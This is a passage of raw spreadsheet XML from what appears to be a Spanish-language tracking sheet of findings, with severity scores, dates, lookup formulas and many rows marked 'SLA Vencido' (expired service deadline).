        <v>45947</v>
      </c>
      <c r="W475" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB475" s="69" t="s">
        <v>1789</v>
      </c>
      <c r="AC475" s="65" t="s">
        <v>1790</v>
      </c>
      <c r="AE475" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG475" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH475" t="str">
        <f>IFERROR(VLOOKUP(H475,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="476" spans="1:34" ht="44.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A476" s="5">
        <v>475</v>
      </c>
      <c r="B476" t="s">
        <v>32</v>
      </c>
      <c r="C476" t="s">
        <v>225</v>
      </c>
      <c r="D476" t="s">
        <v>34</v>
      </c>
      <c r="G476" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H476" t="s">
        <v>1791</v>
      </c>
      <c r="J476" t="s">
        <v>1325</v>
      </c>
      <c r="L476" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M476" t="s">
        <v>61</v>
      </c>
      <c r="N476">
        <v>4.7</v>
      </c>
      <c r="Q476" t="s">
        <v>1792</v>
      </c>
      <c r="T476" s="1">
        <v>45857</v>
      </c>
      <c r="U476" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V476" s="1">
        <f t="shared" si="24"/>
        <v>45947</v>
      </c>
      <c r="W476" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB476" s="69" t="s">
        <v>1793</v>
      </c>
      <c r="AC476" s="65" t="s">
        <v>1794</v>
      </c>
      <c r="AE476" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG476" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH476" t="str">
        <f>IFERROR(VLOOKUP(H476,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="477" spans="1:34" ht="409.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A477" s="5">
        <v>476</v>
      </c>
      <c r="B477" t="s">
        <v>32</v>
      </c>
      <c r="C477" t="s">
        <v>225</v>
      </c>
      <c r="D477" t="s">
        <v>34</v>
      </c>
      <c r="G477" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H477" t="s">
        <v>1795</v>
      </c>
      <c r="J477" t="s">
        <v>971</v>
      </c>
      <c r="L477" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M477" t="s">
        <v>61</v>
      </c>
      <c r="N477">
        <v>5.8</v>
      </c>
      <c r="Q477" t="s">
        <v>1796</v>
      </c>
      <c r="T477" s="1">
        <v>45857</v>
      </c>
      <c r="U477" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V477" s="1">
        <f t="shared" si="24"/>
        <v>45947</v>
      </c>
      <c r="W477" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB477" s="82" t="s">
        <v>1797</v>
      </c>
      <c r="AC477" s="82" t="s">
        <v>1798</v>
      </c>
      <c r="AE477" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG477" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH477" t="str">
        <f>IFERROR(VLOOKUP(H477,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="478" spans="1:34" ht="66" hidden="1" x14ac:dyDescent="0.45">
      <c r="A478" s="5">
        <v>477</v>
      </c>
      <c r="B478" t="s">
        <v>32</v>
      </c>
      <c r="C478" t="s">
        <v>225</v>
      </c>
      <c r="D478" t="s">
        <v>34</v>
      </c>
      <c r="G478" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H478" t="s">
        <v>1799</v>
      </c>
      <c r="J478" t="s">
        <v>1800</v>
      </c>
      <c r="L478" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M478" t="s">
        <v>61</v>
      </c>
      <c r="N478">
        <v>5.8</v>
      </c>
      <c r="Q478" t="s">
        <v>1796</v>
      </c>
      <c r="T478" s="1">
        <v>45857</v>
      </c>
      <c r="U478" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V478" s="1">
        <f t="shared" si="24"/>
        <v>45947</v>
      </c>
      <c r="W478" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB478" s="82" t="s">
        <v>1801</v>
      </c>
      <c r="AC478" s="69" t="s">
        <v>1802</v>
      </c>
      <c r="AE478" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG478" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH478" t="str">
        <f>IFERROR(VLOOKUP(H478,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="479" spans="1:34" ht="33" hidden="1" x14ac:dyDescent="0.45">
      <c r="A479" s="5">
        <v>478</v>
      </c>
      <c r="B479" t="s">
        <v>32</v>
      </c>
      <c r="C479" t="s">
        <v>225</v>
      </c>
      <c r="D479" t="s">
        <v>34</v>
      </c>
      <c r="G479" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H479" t="s">
        <v>1803</v>
      </c>
      <c r="J479" t="s">
        <v>1804</v>
      </c>
      <c r="L479" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M479" t="s">
        <v>61</v>
      </c>
      <c r="N479">
        <v>5</v>
      </c>
      <c r="Q479" t="s">
        <v>1796</v>
      </c>
      <c r="T479" s="1">
        <v>45857</v>
      </c>
      <c r="U479" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V479" s="1">
        <f t="shared" si="24"/>
        <v>45947</v>
      </c>
      <c r="W479" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB479" s="82" t="s">
        <v>1805</v>
      </c>
      <c r="AC479" s="65" t="s">
        <v>1806</v>
      </c>
      <c r="AE479" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG479" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH479" t="str">
        <f>IFERROR(VLOOKUP(H479,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="480" spans="1:34" ht="409.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A480" s="5">
        <v>479</v>
      </c>
      <c r="B480" t="s">
        <v>32</v>
      </c>
      <c r="C480" t="s">
        <v>225</v>
      </c>
      <c r="D480" t="s">
        <v>34</v>
      </c>
      <c r="G480" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H480" t="s">
        <v>1807</v>
      </c>
      <c r="J480" t="s">
        <v>1390</v>
      </c>
      <c r="L480" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M480" t="s">
        <v>61</v>
      </c>
      <c r="N480">
        <v>4.7</v>
      </c>
      <c r="Q480" t="s">
        <v>1796</v>
      </c>
      <c r="T480" s="1">
        <v>45857</v>
      </c>
      <c r="U480" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V480" s="1">
        <f t="shared" si="24"/>
        <v>45947</v>
      </c>
      <c r="W480" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB480" s="82" t="s">
        <v>1808</v>
      </c>
      <c r="AC480" s="82" t="s">
        <v>1809</v>
      </c>
      <c r="AE480" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG480" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH480" t="str">
        <f>IFERROR(VLOOKUP(H480,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="481" spans="1:34" ht="232" hidden="1" x14ac:dyDescent="0.35">
      <c r="A481" s="5">
        <v>480</v>
      </c>
      <c r="B481" t="s">
        <v>32</v>
      </c>
      <c r="C481" t="s">
        <v>425</v>
      </c>
      <c r="D481" t="s">
        <v>34</v>
      </c>
      <c r="G481" s="52" t="s">
        <v>1084</v>
      </c>
      <c r="J481" t="s">
        <v>1810</v>
      </c>
      <c r="L481" t="s">
        <v>655</v>
      </c>
      <c r="M481" t="s">
        <v>111</v>
      </c>
      <c r="Q481" t="s">
        <v>1811</v>
      </c>
      <c r="T481" s="1">
        <v>45887</v>
      </c>
      <c r="U481" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>322</v>
      </c>
      <c r="V481" s="1">
        <f t="shared" si="24"/>
        <v>46007</v>
      </c>
      <c r="W481" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB481" s="32" t="s">
        <v>1060</v>
      </c>
      <c r="AC481" s="32" t="s">
        <v>1061</v>
      </c>
      <c r="AD481" s="9"/>
      <c r="AE481" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG481" s="51" t="s">
        <v>1092</v>
      </c>
      <c r="AH481" t="str">
        <f>IFERROR(VLOOKUP(H481,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="482" spans="1:34" ht="232" hidden="1" x14ac:dyDescent="0.35">
      <c r="A482" s="5">
        <v>481</v>
      </c>
      <c r="B482" t="s">
        <v>32</v>
      </c>
      <c r="C482" t="s">
        <v>425</v>
      </c>
      <c r="D482" t="s">
        <v>34</v>
      </c>
      <c r="G482" s="52" t="s">
        <v>1084</v>
      </c>
      <c r="J482" t="s">
        <v>1810</v>
      </c>
      <c r="L482" t="s">
        <v>655</v>
      </c>
      <c r="M482" t="s">
        <v>111</v>
      </c>
      <c r="Q482" t="s">
        <v>1812</v>
      </c>
      <c r="T482" s="1">
        <v>45887</v>
      </c>
      <c r="U482" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>322</v>
      </c>
      <c r="V482" s="1">
        <f t="shared" si="24"/>
        <v>46007</v>
      </c>
      <c r="W482" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB482" s="32" t="s">
        <v>1060</v>
      </c>
      <c r="AC482" s="32" t="s">
        <v>1061</v>
      </c>
      <c r="AD482" s="9"/>
      <c r="AE482" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG482" s="51" t="s">
        <v>1092</v>
      </c>
      <c r="AH482" t="str">
        <f>IFERROR(VLOOKUP(H482,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="483" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A483" s="5">
        <v>482</v>
      </c>
      <c r="B483" t="s">
        <v>32</v>
      </c>
      <c r="C483" t="s">
        <v>225</v>
      </c>
      <c r="D483" t="s">
        <v>34</v>
      </c>
      <c r="G483" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H483" t="s">
        <v>1813</v>
      </c>
      <c r="J483" t="s">
        <v>971</v>
      </c>
      <c r="L483" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M483" t="s">
        <v>61</v>
      </c>
      <c r="N483" t="s">
        <v>1326</v>
      </c>
      <c r="Q483" t="s">
        <v>1391</v>
      </c>
      <c r="T483" s="1">
        <v>45885</v>
      </c>
      <c r="U483" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>324</v>
      </c>
      <c r="V483" s="1">
        <f t="shared" si="24"/>
        <v>45975</v>
      </c>
      <c r="W483" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB483" t="s">
        <v>1753</v>
      </c>
      <c r="AC483" t="s">
        <v>1754</v>
      </c>
      <c r="AE483" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG483" s="51" t="s">
        <v>969</v>
      </c>
      <c r="AH483" t="str">
        <f>IFERROR(VLOOKUP(H483,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="484" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A484" s="5">
        <v>483</v>
      </c>
      <c r="B484" t="s">
        <v>32</v>
      </c>
      <c r="C484" t="s">
        <v>225</v>
      </c>
      <c r="D484" t="s">
        <v>34</v>
      </c>
      <c r="G484" s="52" t="s">
        <v>171</v>
      </c>
      <c r="H484" t="s">
        <v>1814</v>
      </c>
      <c r="J484" t="s">
        <v>556</v>
      </c>
      <c r="L484" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M484" t="s">
        <v>61</v>
      </c>
      <c r="N484" t="s">
        <v>1514</v>
      </c>
      <c r="Q484" t="s">
        <v>176</v>
      </c>
      <c r="T484" s="1">
        <v>45885</v>
      </c>
      <c r="U484" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>324</v>
      </c>
      <c r="V484" s="1">
        <f t="shared" si="24"/>
        <v>45975</v>
      </c>
      <c r="W484" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB484" t="s">
        <v>1726</v>
      </c>
      <c r="AC484" t="s">
        <v>1727</v>
      </c>
      <c r="AE484" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG484" s="51" t="s">
        <v>149</v>
      </c>
      <c r="AH484" t="str">
        <f>IFERROR(VLOOKUP(H484,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="485" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A485" s="5">
        <v>484</v>
      </c>
      <c r="B485" t="s">
        <v>32</v>
      </c>
      <c r="C485" t="s">
        <v>225</v>
      </c>
      <c r="D485" t="s">
        <v>34</v>
      </c>
      <c r="G485" s="52" t="s">
        <v>171</v>
      </c>
      <c r="H485" t="s">
        <v>1815</v>
      </c>
      <c r="J485" t="s">
        <v>560</v>
      </c>
      <c r="L485" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M485" t="s">
        <v>61</v>
      </c>
      <c r="N485" t="s">
        <v>1514</v>
      </c>
      <c r="Q485" t="s">
        <v>176</v>
      </c>
      <c r="T485" s="1">
        <v>45885</v>
      </c>
      <c r="U485" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>324</v>
      </c>
      <c r="V485" s="1">
        <f t="shared" si="24"/>
        <v>45975</v>
      </c>
      <c r="W485" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB485" t="s">
        <v>1733</v>
      </c>
      <c r="AC485" t="s">
        <v>1734</v>
      </c>
      <c r="AE485" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG485" s="51" t="s">
        <v>149</v>
      </c>
      <c r="AH485" t="str">
        <f>IFERROR(VLOOKUP(H485,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="486" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A486" s="5">
        <v>485</v>
      </c>
      <c r="B486" t="s">
        <v>32</v>
      </c>
      <c r="C486" t="s">
        <v>33</v>
      </c>
      <c r="D486" t="s">
        <v>34</v>
      </c>
      <c r="G486" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H486" t="s">
        <v>1817</v>
      </c>
      <c r="I486" t="s">
        <v>1818</v>
      </c>
      <c r="J486" t="s">
        <v>1095</v>
      </c>
      <c r="L486" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M486" t="s">
        <v>42</v>
      </c>
      <c r="N486" t="s">
        <v>1819</v>
      </c>
      <c r="Q486" t="s">
        <v>1820</v>
      </c>
      <c r="T486" s="1">
        <v>45883</v>
      </c>
      <c r="U486" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>326</v>
      </c>
      <c r="V486" s="1">
        <f t="shared" si="24"/>
        <v>45893</v>
      </c>
      <c r="W486" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB486" t="s">
        <v>1821</v>
      </c>
      <c r="AC486" t="s">
        <v>1822</v>
      </c>
      <c r="AE486" s="81">
        <v>45891</v>
      </c>
      <c r="AG486" s="27" t="s">
        <v>1823</v>
      </c>
      <c r="AH486" t="str">
        <f>IFERROR(VLOOKUP(H486,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="487" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A487" s="5">
        <v>486</v>
      </c>
      <c r="B487" t="s">
        <v>32</v>
      </c>
      <c r="C487" t="s">
        <v>33</v>
      </c>
      <c r="D487" t="s">
        <v>34</v>
      </c>
      <c r="G487" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H487" t="s">
        <v>1824</v>
      </c>
      <c r="I487" t="s">
        <v>1825</v>
      </c>
      <c r="J487" t="s">
        <v>1826</v>
      </c>
      <c r="L487" t="s">
        <v>655</v>
      </c>
      <c r="M487" t="s">
        <v>61</v>
      </c>
      <c r="N487" t="s">
        <v>1827</v>
      </c>
      <c r="Q487" t="s">
        <v>1820</v>
      </c>
      <c r="T487" s="1">
        <v>45883</v>
      </c>
      <c r="U487" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>326</v>
      </c>
      <c r="V487" s="1">
        <f t="shared" si="24"/>
        <v>45973</v>
      </c>
      <c r="W487" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB487" t="s">
        <v>1828</v>
      </c>
      <c r="AC487" t="s">
        <v>1829</v>
      </c>
      <c r="AE487" s="81" t="s">
        <v>3463</v>
      </c>
      <c r="AG487" s="27" t="s">
        <v>1823</v>
      </c>
      <c r="AH487" t="str">
        <f>IFERROR(VLOOKUP(H487,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="488" spans="1:34" ht="44.25" hidden="1" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A488" s="5">
        <v>487</v>
      </c>
      <c r="B488" t="s">
        <v>32</v>
      </c>
      <c r="C488" t="s">
        <v>33</v>
      </c>
      <c r="D488" t="s">
        <v>34</v>
      </c>
      <c r="G488" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H488" t="s">
        <v>1830</v>
      </c>
      <c r="I488" t="s">
        <v>1831</v>
      </c>
      <c r="J488" t="s">
        <v>80</v>
      </c>
      <c r="L488" t="s">
        <v>655</v>
      </c>
      <c r="M488" t="s">
        <v>61</v>
      </c>
      <c r="N488" t="s">
        <v>1832</v>
      </c>
      <c r="Q488" t="s">
        <v>1820</v>
      </c>
      <c r="T488" s="1">
        <v>45883</v>
      </c>
      <c r="U488" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>326</v>
      </c>
      <c r="V488" s="1">
        <f t="shared" si="24"/>
        <v>45973</v>
      </c>
      <c r="W488" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB488" t="s">
        <v>1833</v>
      </c>
      <c r="AC488" t="s">
        <v>1834</v>
      </c>
      <c r="AE488" s="81">
        <v>45921</v>
      </c>
      <c r="AG488" s="27" t="s">
        <v>1823</v>
      </c>
      <c r="AH488" t="str">
        <f>IFERROR(VLOOKUP(H488,hoja1!A:A,1,),"N/A")</f>
        <v>MAN-689dbfbe07d3017240603435</v>
      </c>
    </row>
    <row r="489" spans="1:34" ht="44.25" hidden="1" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A489" s="5">
        <v>488</v>
      </c>
      <c r="B489" t="s">
        <v>32</v>
      </c>
      <c r="C489" t="s">
        <v>33</v>
      </c>
      <c r="D489" t="s">
        <v>34</v>
      </c>
      <c r="G489" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H489" t="s">
        <v>1835</v>
      </c>
      <c r="I489" t="s">
        <v>1836</v>
      </c>
      <c r="J489" t="s">
        <v>1198</v>
      </c>
      <c r="L489" t="s">
        <v>655</v>
      </c>
      <c r="M489" t="s">
        <v>61</v>
      </c>
      <c r="N489" t="s">
        <v>1837</v>
      </c>
      <c r="Q489" t="s">
        <v>1820</v>
      </c>
      <c r="T489" s="1">
        <v>45883</v>
      </c>
      <c r="U489" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>326</v>
      </c>
      <c r="V489" s="1">
        <f t="shared" si="24"/>
        <v>45973</v>
      </c>
      <c r="W489" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB489" t="s">
        <v>1838</v>
      </c>
      <c r="AC489" t="s">
        <v>1839</v>
      </c>
      <c r="AE489" s="81" t="s">
        <v>3463</v>
      </c>
      <c r="AG489" s="27" t="s">
        <v>1823</v>
      </c>
      <c r="AH489" t="str">
        <f>IFERROR(VLOOKUP(H489,hoja1!A:A,1,),"N/A")</f>
        <v>MAN-689dc1fa07d3017240603436</v>
      </c>
    </row>
    <row r="490" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A490" s="5">
        <v>489</v>
      </c>
      <c r="B490" t="s">
        <v>32</v>
      </c>
      <c r="C490" t="s">
        <v>33</v>
      </c>
      <c r="D490" t="s">
        <v>34</v>
      </c>
      <c r="G490" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="I490" t="s">
        <v>1840</v>
      </c>
      <c r="J490" t="s">
        <v>1760</v>
      </c>
      <c r="L490" t="s">
        <v>141</v>
      </c>
      <c r="M490" t="s">
        <v>111</v>
      </c>
      <c r="N490">
        <v>3</v>
      </c>
      <c r="Q490" t="s">
        <v>1820</v>
      </c>
      <c r="T490" s="1">
        <v>45883</v>
      </c>
      <c r="U490" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>326</v>
      </c>
      <c r="V490" s="1">
        <f t="shared" si="24"/>
        <v>46003</v>
      </c>
      <c r="W490" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB490" s="65" t="s">
        <v>1761</v>
      </c>
      <c r="AC490" s="65" t="s">
        <v>1841</v>
      </c>
      <c r="AD490" t="s">
        <v>1842</v>
      </c>
      <c r="AE490" s="81">
        <v>45921</v>
      </c>
      <c r="AG490" s="27" t="s">
        <v>1823</v>
      </c>
      <c r="AH490" t="str">
        <f>IFERROR(VLOOKUP(H490,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="491" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A491" s="5">
        <v>490</v>
      </c>
      <c r="B491" t="s">
        <v>32</v>
      </c>
      <c r="C491" t="s">
        <v>225</v>
      </c>
      <c r="D491" t="s">
        <v>34</v>
      </c>
      <c r="G491" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H491" s="83" t="s">
        <v>1843</v>
      </c>
      <c r="J491" s="83" t="s">
        <v>1844</v>
      </c>
      <c r="L491" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M491" t="s">
        <v>522</v>
      </c>
      <c r="N491">
        <v>7.5</v>
      </c>
      <c r="Q491" s="83" t="s">
        <v>1845</v>
      </c>
      <c r="T491" s="1">
        <v>45906</v>
      </c>
      <c r="U491" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>303</v>
      </c>
      <c r="V491" s="1">
        <f t="shared" si="24"/>
        <v>45936</v>
      </c>
      <c r="W491" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB491" t="s">
        <v>1846</v>
      </c>
      <c r="AC491" t="s">
        <v>1847</v>
      </c>
      <c r="AD491" t="s">
        <v>1848</v>
      </c>
      <c r="AE491" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG491" s="51" t="s">
        <v>969</v>
      </c>
      <c r="AH491" t="str">
        <f>IFERROR(VLOOKUP(H491,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="492" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A492" s="5">
        <v>491</v>
      </c>
      <c r="B492" t="s">
        <v>32</v>
      </c>
      <c r="C492" t="s">
        <v>225</v>
      </c>
      <c r="D492" t="s">
        <v>34</v>
      </c>
      <c r="G492" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H492" t="s">
        <v>1849</v>
      </c>
      <c r="J492" s="83" t="s">
        <v>1844</v>
      </c>
      <c r="L492" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M492" t="s">
        <v>522</v>
      </c>
      <c r="N492">
        <v>7.5</v>
      </c>
      <c r="Q492" s="83" t="s">
        <v>1850</v>
      </c>
      <c r="T492" s="1">
        <v>45906</v>
      </c>
      <c r="U492" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>303</v>
      </c>
      <c r="V492" s="1">
        <f t="shared" si="24"/>
        <v>45936</v>
      </c>
      <c r="W492" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB492" t="s">
        <v>1846</v>
      </c>
      <c r="AC492" t="s">
        <v>1851</v>
      </c>
      <c r="AD492" t="s">
        <v>1848</v>
      </c>
      <c r="AE492" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG492" s="51" t="s">
        <v>969</v>
      </c>
      <c r="AH492" t="str">
        <f>IFERROR(VLOOKUP(H492,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="493" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A493" s="5">
        <v>492</v>
      </c>
      <c r="B493" t="s">
        <v>32</v>
      </c>
      <c r="C493" t="s">
        <v>225</v>
      </c>
      <c r="D493" t="s">
        <v>34</v>
      </c>
      <c r="G493" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H493" s="83" t="s">
        <v>1852</v>
      </c>
      <c r="J493" s="83" t="s">
        <v>1844</v>
      </c>
      <c r="L493" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M493" t="s">
        <v>522</v>
      </c>
      <c r="N493">
        <v>7.5</v>
      </c>
      <c r="Q493" s="83" t="s">
        <v>1853</v>
      </c>
      <c r="T493" s="1">
        <v>45906</v>
      </c>
      <c r="U493" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>303</v>
      </c>
      <c r="V493" s="1">
        <f t="shared" si="24"/>
        <v>45936</v>
      </c>
      <c r="W493" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB493" t="s">
        <v>1846</v>
      </c>
      <c r="AC493" t="s">
        <v>1854</v>
      </c>
      <c r="AD493" t="s">
        <v>1848</v>
      </c>
      <c r="AE493" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG493" s="51" t="s">
        <v>969</v>
      </c>
      <c r="AH493" t="str">
        <f>IFERROR(VLOOKUP(H493,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="494" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A494" s="5">
        <v>493</v>
      </c>
      <c r="B494" t="s">
        <v>32</v>
      </c>
      <c r="C494" t="s">
        <v>225</v>
      </c>
      <c r="D494" t="s">
        <v>34</v>
      </c>
      <c r="G494" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H494" s="83" t="s">
        <v>1855</v>
      </c>
      <c r="J494" s="83" t="s">
        <v>1844</v>
      </c>
      <c r="L494" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M494" t="s">
        <v>522</v>
      </c>
      <c r="N494">
        <v>7.5</v>
      </c>
      <c r="Q494" s="83" t="s">
        <v>1856</v>
      </c>
      <c r="T494" s="1">
        <v>45906</v>
      </c>
      <c r="U494" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>303</v>
      </c>
      <c r="V494" s="1">
        <f t="shared" si="24"/>
        <v>45936</v>
      </c>
      <c r="W494" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB494" t="s">
        <v>1846</v>
      </c>
      <c r="AC494" t="s">
        <v>1857</v>
      </c>
      <c r="AD494" t="s">
        <v>1848</v>
      </c>
      <c r="AE494" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG494" s="51" t="s">
        <v>969</v>
      </c>
      <c r="AH494" t="str">
        <f>IFERROR(VLOOKUP(H494,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="495" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A495" s="5">
        <v>494</v>
      </c>
      <c r="B495" t="s">
        <v>32</v>
      </c>
      <c r="C495" t="s">
        <v>225</v>
      </c>
      <c r="D495" t="s">
        <v>34</v>
      </c>
      <c r="G495" s="52" t="s">
        <v>1323</v>
      </c>
      <c r="H495" s="83" t="s">
        <v>1858</v>
      </c>
      <c r="J495" s="83" t="s">
        <v>1844</v>
      </c>
      <c r="L495" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M495" t="s">
        <v>522</v>
      </c>
      <c r="N495">
        <v>7.5</v>
      </c>
      <c r="Q495" s="83" t="s">
        <v>1859</v>
      </c>
      <c r="T495" s="1">
        <v>45906</v>
      </c>
      <c r="U495" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>303</v>
      </c>
      <c r="V495" s="1">
        <f t="shared" si="24"/>
        <v>45936</v>
      </c>
      <c r="W495" s="56" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB495" t="s">
        <v>1846</v>
      </c>
      <c r="AC495" t="s">
        <v>1860</v>
      </c>
      <c r="AD495" t="s">
        <v>1848</v>
      </c>
      <c r="AE495" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG495" s="51" t="s">
        <v>969</v>
      </c>
